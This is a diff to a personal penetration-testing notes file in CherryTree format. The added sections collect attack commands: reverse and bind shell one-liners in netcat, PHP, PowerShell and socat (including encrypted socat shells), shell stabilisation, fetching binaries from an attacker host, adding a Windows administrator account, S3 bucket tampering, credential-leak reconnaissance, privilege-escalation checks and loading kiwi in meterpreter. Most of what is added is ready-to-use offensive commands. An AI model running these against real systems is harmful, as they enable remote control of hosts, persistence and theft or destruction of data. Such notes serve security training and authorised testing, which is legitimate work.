@@ -84,7 +84,7 @@ extracting metadata
 pdfinfo &lt;file_pdf&gt;</rich_text>
 		</node>
 	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="networking" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393999.91" ts_lastsave="1655395231.37" unique_id="13">
+	<node custom_icon_id="0" foreground="" is_bold="False" name="networking" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393999.91" ts_lastsave="1655800209.49" unique_id="13">
 		<rich_text foreground="#d4d4d4">OpenVPN connect
 sudo openvpn &lt;file_input&gt;</rich_text>
 		<rich_text>
@@ -159,6 +159,122 @@ nc -lvp [listening port]</rich_text>
 </rich_text>
 		<rich_text foreground="#d4d4d4">connect to tellnet
 telnet &lt;ip&gt; &lt;port&gt;</rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="socat" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655800209.49" ts_lastsave="1655800236.3" unique_id="50">
+			<rich_text style="italic" underline="single">Reverse Shells</rich_text>
+			<rich_text>
+As mentioned previously, the  syntax for socat gets a lot harder than that of netcat. Here's the  syntax for a basic reverse shell listener in socat:
+
+</rich_text>
+			<rich_text family="monospace">socat TCP-L:&lt;port&gt; -</rich_text>
+			<rich_text>
+
+As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to </rich_text>
+			<rich_text family="monospace">nc -lvnp &lt;port&gt;</rich_text>
+			<rich_text>.
+On Windows we would use this command to connect back:
+</rich_text>
+			<rich_text family="monospace">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes</rich_text>
+			<rich_text>
+
+The &quot;pipes&quot; option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
+
+This is the equivalent command for a Linux Target:
+</rich_text>
+			<rich_text family="monospace">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:&quot;bash -li&quot;</rich_text>
+			<rich_text>
+
+</rich_text>
+			<rich_text style="italic" underline="single">Bind Shells</rich_text>
+			<rich_text>
+On a Linux target we would use the following command:
+</rich_text>
+			<rich_text family="monospace">socat TCP-L:&lt;PORT&gt; EXEC:&quot;bash -li&quot;</rich_text>
+			<rich_text>
+
+On a Windows target we would use this command for our listener:
+</rich_text>
+			<rich_text family="monospace">socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes</rich_text>
+			<rich_text>
+
+We use the &quot;pipes&quot; argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.
+
+Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.
+</rich_text>
+			<rich_text family="monospace">socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -</rich_text>
+			<rich_text style="italic" underline="single">
+</rich_text>
+			<rich_text>
+Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is </rich_text>
+			<rich_text style="italic">significantly </rich_text>
+			<rich_text>more  stable. As mentioned earlier, socat is an incredibly versatile tool;  however, the following technique is perhaps one of its most useful  applications. Here is the new listener syntax:
+
+</rich_text>
+			<rich_text family="monospace">socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0</rich_text>
+			<rich_text> 
+
+Let's  break this command down into its two parts. As usual, we're connecting  two points together. In this case those points are a listening port, and  a file. Specifically, we are passing in the current TTY as a file and  setting the echo to be zero. This is approximately equivalent to using  the Ctrl + Z, </rich_text>
+			<rich_text family="monospace">stty raw -echo; fg</rich_text>
+			<rich_text> trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.
+The  first listener can be connected to with any payload; however, this  special listener must be activated with a very specific socat command.  This means that the target must have socat installed. Most machines do  not have socat installed by default, however, it's possible to upload a </rich_text>
+			<rich_text link="webs https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">precompiled socat binary</rich_text>
+			<rich_text>, which can then be executed as normal.
+The special command is as follows:
+</rich_text>
+			<rich_text family="monospace">socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</rich_text>
+			<rich_text>
+
+This is a handful, so let's break it down.
+The  first part is easy -- we're linking up with the listener running on our  own machine. The second part of the command creates an interactive bash  session with  </rich_text>
+			<rich_text family="monospace">EXEC:&quot;bash -li&quot;</rich_text>
+			<rich_text>
+
+One of the many great things about socat is that it's capable  of creating encrypted shells -- both bind and reverse. Why would we want  to do this? Encrypted shells cannot be spied on unless you have the  decryption key, and are often able to bypass an IDS as a result.
+
+We  covered how to create basic shells in the previous task, so that syntax  will not be covered again here. Suffice to say that any time </rich_text>
+			<rich_text family="monospace">TCP</rich_text>
+			<rich_text> was used as part of a command, this should be replaced with </rich_text>
+			<rich_text family="monospace">OPENSSL</rich_text>
+			<rich_text>  when working with encrypted shells. We'll cover a few examples at the  end of the task, but first let's talk about certificates. 
+We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:
+                  
+</rich_text>
+			<rich_text family="monospace">openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</rich_text>
+			<rich_text>
+
+This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
+We then need to merge the two created files into a single </rich_text>
+			<rich_text family="monospace">.pem</rich_text>
+			<rich_text> file:
+</rich_text>
+			<rich_text family="monospace">cat shell.key shell.crt &gt; shell.pem</rich_text>
+			<rich_text>
+
+Now, when we set up our reverse shell listener, we use:
+</rich_text>
+			<rich_text family="monospace">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 -</rich_text>
+			<rich_text>
+
+This sets up an OPENSSL listener using our generated certificate. </rich_text>
+			<rich_text family="monospace">verify=0</rich_text>
+			<rich_text> tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate </rich_text>
+			<rich_text style="italic" underline="single">must</rich_text>
+			<rich_text> be used on whichever device is listening.
+
+To connect back, we would use:
+</rich_text>
+			<rich_text family="monospace">socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash</rich_text>
+			<rich_text>
+
+The same technique would apply for a bind shell:
+Target:
+</rich_text>
+			<rich_text family="monospace">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</rich_text>
+			<rich_text>
+
+Attacker:
+</rich_text>
+			<rich_text family="monospace">socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</rich_text>
+		</node>
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="os_commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394169.77" ts_lastsave="1655394196.01" unique_id="14">
 		<rich_text></rich_text>
@@ -235,7 +351,7 @@ find -name &lt;filename_can_wildcard&gt;</rich_text>
 		</node>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="windows" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394181.49" ts_lastsave="1655649452.75" unique_id="16">
 			<rich_text></rich_text>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="cmd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394591.77" ts_lastsave="1655394602.23" unique_id="23">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="cmd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394591.77" ts_lastsave="1655817354.24" unique_id="23">
 				<rich_text>get hostname / pc name
 hostname
 
@@ -267,7 +383,18 @@ call control panel
 control
 
 control panel update config
-control /name Microsoft.WindowsUpdate</rich_text>
+control /name Microsoft.WindowsUpdate
+
+add user as admin
+</rich_text>
+				<rich_text family="monospace">net localgroup administrators &lt;username&gt; /add</rich_text>
+				<rich_text>
+
+add user
+</rich_text>
+				<rich_text family="monospace">net user &lt;username&gt; &lt;password&gt; /add</rich_text>
+				<rich_text>
+c</rich_text>
 			</node>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="env_path" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394602.23" ts_lastsave="1655394612.52" unique_id="24">
 				<rich_text>windows root directory
@@ -555,8 +682,30 @@ $FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Proper
 python3 -m http.server &lt;port&gt;</rich_text>
 		</node>
 	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="recon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394208.07" ts_lastsave="1655394769.66" unique_id="18">
+	<node custom_icon_id="0" foreground="" is_bold="False" name="recon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394208.07" ts_lastsave="1655797967.12" unique_id="18">
 		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="S3_testing" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655797334.56" ts_lastsave="1655814645.25" unique_id="48">
+			<rich_text>Once you’ve found a couple of buckets that belong to the target organization, use the AWS command line tool to see if you can access one. Install the tool by using the following command:
+pip install awscli
+
+Then configure it to work with AWS by following Amazon’s documentation at </rich_text>
+			<rich_text link="webs https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html.">https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html.</rich_text>
+			<rich_text> Now you should be able to access buckets directly from your terminal via the aws s3 command. Try listing the contents of the bucket you found:
+
+aws s3 ls s3://BUCKET_NAME/
+
+If this works, see if you can read the contents of any interesting files by copying files to your local machine:
+aws s3 cp s3://BUCKET_NAME/FILE_NAME/path/to/local/directory
+
+Gather any useful information leaked via the bucket and use it for future exploitation! If the organization reveals information such as active API keys or personal information, you should report this right away. Exposed S3 buckets alone are often considered a vulnerability. You can also try to upload new files to the bucket or delete files from it. If you can mess with its contents, you might be able to tamper with the web application’s operations or corrupt company data. For example, this command will copy your local file named TEST_FILE into the target’s S3 bucket:
+
+aws s3 cp TEST_FILE s3://BUCKET_NAME/
+
+And this command will remove the TEST_FILE that you just uploaded:
+
+aws s3 rm s3://BUCKET_NAME/TEST_FILE
+</rich_text>
+		</node>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="enum4linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394769.66" ts_lastsave="1655394791.58" unique_id="28">
 			<rich_text>SMBShare enumeration
 enum4linux -a &lt;ip&gt;</rich_text>
@@ -574,10 +723,13 @@ dig &lt;ip/domain_target&gt;
 whois
 whois &lt;ip/domain_target&gt;</rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="gobuster" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394811.27" ts_lastsave="1655471333.24" unique_id="30">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="gobuster" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394811.27" ts_lastsave="1655794881.49" unique_id="30">
 			<rich_text>gobuster dir -u </rich_text>
 			<rich_text link="webs http://&lt;url&gt;">http://&lt;url&gt;</rich_text>
-			<rich_text> -w &lt;path_to_wordlist&gt;</rich_text>
+			<rich_text> -w &lt;path_to_wordlist&gt;
+
+gobuster dns -d target_domain -w wordlist
+</rich_text>
 		</node>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="nmap" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394814.09" ts_lastsave="1655394981.76" unique_id="31">
 			<rich_text foreground="#569cd6">default</rich_text>
@@ -672,14 +824,130 @@ nslookup --type=CNAME website.thm
 nslookup --type=MX website.thm
 nslookup --type=TXT website.thm</rich_text>
 		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="google_dork" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655797145.35" ts_lastsave="1655797270.0" unique_id="46">
+			<rich_text>third party
+
+site:s3.amazonaws.com COMPANY_NAME
+site:amazonaws.com COMPANY_NAME
+
+amazonaws s3 COMPANY_NAME
+amazonaws bucket COMPANY_NAME
+amazonaws COMPANY_NAME
+s3 COMPANY_NAME
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="crt.sh" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655797274.1" ts_lastsave="1655797274.62" unique_id="47">
+			<rich_text link="webs https://crt.sh/">https://crt.sh/</rich_text>
+			<rich_text>?q=facebook.com&amp;output=json.
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="github_recon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655797967.12" ts_lastsave="1655798008.49" unique_id="49">
+			<rich_text>Tools like Gitrob and TruffleHog can automate the GitHub recon process. Gitrob (</rich_text>
+			<rich_text link="webs https://github.com/michenriksen/gitrob/)">https://github.com/michenriksen/gitrob/)</rich_text>
+			<rich_text> locates potentially sensitive files pushed to public repositories on GitHub. TruffleHog (</rich_text>
+			<rich_text link="webs https://github.com/">https://github.com/</rich_text>
+			<rich_text>trufflesecurity/truffleHog/) specializes in finding secrets in repositories by conducting regex searches and scanning for high-entropy strings.
+
+After you’ve found leaked credentials, you can use KeyHacks (</rich_text>
+			<rich_text link="webs https://github.com/streaak/keyhacks/)">https://github.com/streaak/keyhacks/)</rich_text>
+			<rich_text> to check if the credentials are valid and learn how to use them to access the target’s services</rich_text>
+		</node>
 	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="exploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471333.24" ts_lastsave="1655471362.28" unique_id="36">
+	<node custom_icon_id="0" foreground="" is_bold="False" name="exploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471333.24" ts_lastsave="1655817747.98" unique_id="36">
 		<rich_text></rich_text>
-	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="command_injection" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471362.28" ts_lastsave="1655471836.88" unique_id="37">
-		<rich_text>Reverse
+		<node custom_icon_id="0" foreground="" is_bold="False" name="command_injection_or_shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471362.28" ts_lastsave="1655814591.42" unique_id="37">
+			<rich_text>Reverse
+
 nc 172.16.1.100 1234 -e /bin/sh
-php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</rich_text>
+
+php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+
+mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f
+
+powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient('&lt;ip&gt;',&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;
+
+bind shell
+mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</rich_text>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="post_exploit_shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655814635.88" ts_lastsave="1655814635.88" unique_id="51">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="shell_stabilizer" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655791685.61" ts_lastsave="1655814638.98" unique_id="45">
+			<rich_text>stable shell
+technique 1:
+
+spawn shell
+python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+
+set_xterm
+</rich_text>
+			<rich_text family="monospace">export TERM=xterm</rich_text>
+			<rich_text> -- this will give us access to term commands such as </rich_text>
+			<rich_text family="monospace">clear</rich_text>
+			<rich_text>
+
+lastly
+</rich_text>
+			<rich_text family="monospace">stty raw -echo; fg</rich_text>
+			<rich_text>
+
+technique 2:
+rlwrap
+</rich_text>
+			<rich_text family="monospace">rlwrap nc -lvnp &lt;port&gt;</rich_text>
+			<rich_text>
+</rich_text>
+			<rich_text family="monospace">stty raw -echo; fg</rich_text>
+			<rich_text>
+
+tehcnique3:
+The third easy way to stabilise a shell is quite simply to use  an initial netcat shell as a stepping stone into a more fully-featured  socat shell. Bear in mind that this technique is limited to Linux  targets, as a Socat shell on Windows will be no more stable than a  netcat shell. To accomplish this method of stabilisation we would first  transfer a </rich_text>
+			<rich_text link="webs https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">socat static compiled binary</rich_text>
+			<rich_text>  (a version of the program compiled to have no dependencies) up to the  target machine. A typical way to achieve this would be using a webserver  on the attacking machine inside the directory containing your socat  binary (</rich_text>
+			<rich_text family="monospace">sudo python3 -m http.server 80</rich_text>
+			<rich_text>), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (</rich_text>
+			<rich_text family="monospace">wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat</rich_text>
+			<rich_text>). 
+For  the sake of completeness: in a Windows CLI environment the same can be  done with Powershell, using either Invoke-WebRequest or a webrequest  system class, depending on the version of Powershell installed (</rich_text>
+			<rich_text family="monospace">Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\Windows\temp\socat.exe</rich_text>
+			<rich_text>). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks. 
+
+
+post stabilization:
+run </rich_text>
+			<rich_text family="monospace">stty -a</rich_text>
+			<rich_text>. This will give you a large stream of output. Note down the values for &quot;rows&quot; and columns:
+Next, in your reverse/bind shell, type in:
+</rich_text>
+			<rich_text family="monospace">stty rows &lt;number&gt;</rich_text>
+			<rich_text>
+
+and
+</rich_text>
+			<rich_text family="monospace">stty cols &lt;number&gt;</rich_text>
+			<rich_text>
+
+</rich_text>
+			<rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</rich_text>
+			<rich_text>
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="privesc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655817747.98" ts_lastsave="1655818032.31" unique_id="52">
+			<rich_text>find SUID
+
+find / -perm -u=s -type f 2&gt;/dev/null
+
+find  executable with sudo
+sudo -l 
+
+check if /etc/passwd writeable
+ls -la /etc/passwd
+rewrite root, or add new user
+
+check /etc/crontab
+cat /etc/crontab</rich_text>
+		</node>
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="tests" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394210.03" ts_lastsave="1655727693.85" unique_id="19">
 		<rich_text></rich_text>
@@ -819,7 +1087,7 @@ example
 </rich_text>
 			<rich_text family="monospace">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf</rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="meterpreter" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655729174.31" ts_lastsave="1655729544.87" unique_id="44">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="meterpreter" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655729174.31" ts_lastsave="1655729843.63" unique_id="44">
 			<rich_text>get meterpreter pid
 </rich_text>
 			<rich_text family="monospace">getpid</rich_text>
@@ -980,6 +1248,12 @@ Others Commands (these         will be listed under different menu categories in
 			<rich_text family="monospace">hashdump</rich_text>
 			<rich_text>: Dumps the contents             of the SAM database
 
+
+loading python into meterpreter
+load python
+
+loading kiwi into meterpreter
+load kiwi
 </rich_text>
 		</node>
 	</node>
